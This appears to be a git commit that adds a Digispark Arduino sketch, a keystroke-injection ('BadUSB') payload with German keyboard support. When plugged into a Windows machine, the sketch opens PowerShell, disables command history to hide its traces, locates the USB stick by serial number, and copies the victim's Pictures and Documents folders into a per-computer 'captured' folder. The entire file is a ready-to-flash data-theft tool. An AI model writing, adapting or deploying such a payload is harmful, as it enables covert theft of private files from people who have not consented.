67c4daa8482e0b5fd402d000e444b3052a4c275e
~neogret <51057212+neogret@users.noreply.github.com>
2019-05-26 17:55:41 +0000

    added 'copyfiles' QWERTY and QWERTZ keyboard support

---
+++ copyfiles_git_de.ino
@@ -0,0 +1,90 @@
+#include "DigiKeyboard.h"
+#include "DigiKeyboardDe.h"
+
+void setup() {
+  pinMode(1, OUTPUT); // LED ON MODEL A
+}
+void loop() {
+
+  DigiKeyboard.update();
+  DigiKeyboard.delay(5000);
+  digitalWrite(1, HIGH);
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(300);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // RUN
+  DigiKeyboard.delay(500);
+  DigiKeyboardDe.print(F("powershell"));
+  DigiKeyboard.delay(300);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(10000);
+  DigiKeyboardDe.print(F("Set-PSReadlineOption -HistorySaveStyle SaveNothing")); // ONLY WORKS ON WINDOWS 10 
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboardDe.print(F("$vol = get-wmiobject -Class Win32_Volume | where{$_.SerialNumber -eq YOUR_SERIAL_NUMBER}")); // SELECT THE USB DEVICE WITH MATCHING SERIAL NUMBER
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboardDe.print(F("$dl = $vol.DriveLetter; $cn = $env:computername")); // SET DRIVE LETTER VARIABLE, SET COMPUTERNAME VARIABLE
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboardDe.print(F("cd $dl\\captured\\")); // CREATE FOLDER "captured" ON USBs MAIN DIRECTORY
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboardDe.print(F("mkdir $cn"));
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // RUN
+  DigiKeyboard.delay(500);
+  DigiKeyboardDe.print(F("powershell"));
+  DigiKeyboard.delay(300);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(10000);
+  DigiKeyboardDe.print(F("$vol = get-wmiobject -Class Win32_Volume | where{$_.SerialNumber -eq YOUR_SERIAL_NUMBER}"));
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboardDe.print(F("$dl = $vol.DriveLetter; $cn = $env:computername"));
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboardDe.print(F("cd $dl\\captured\\$cn\\"));
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboardDe.print(F("Copy-Item -Path $env:userprofile\\Pictures\\ -Recurse -Destination Pictures\\; exit")); // COPY ALL PICTURES FROM %USERPROFILE%/PICTURES/ TO USB/CAPTURED/_COMPUTERNAME_/PICTURES
+                                                                                                                  // REMOVE "; exit" WHEN ENCOUNTERING ISSUES WITH THE PAYLOAD
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboardDe.print(F("powershell"));
+  DigiKeyboard.delay(300);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(10000);
+  DigiKeyboardDe.print(F("$vol = get-wmiobject -Class Win32_Volume | where{$_.SerialNumber -eq YOUR_SERIAL_NUMBER}"));
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboardDe.print(F("$dl = $vol.DriveLetter; $cn = $env:computername")); 
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboardDe.print(F("cd $dl\\captured\\$cn\\"));
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboardDe.print(F("Copy-Item -Path $env:userprofile\\Documents\\ -Recurse -Destination Documents\\; exit")); // COPY ALL DOCUMENTS FROM %USERPROFILE%/DOCUMENTS/ TO USB/CAPTURED/_COMPUTERNAME_/DOCUMENTS
+                                                                                                                    // REMOVE "; exit" WHEN ENCOUNTERING ISSUES WITH THE PAYLOAD
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(10000);
+  
+  digitalWrite(1, LOW);
+  DigiKeyboard.delay(3000);
+  
+}
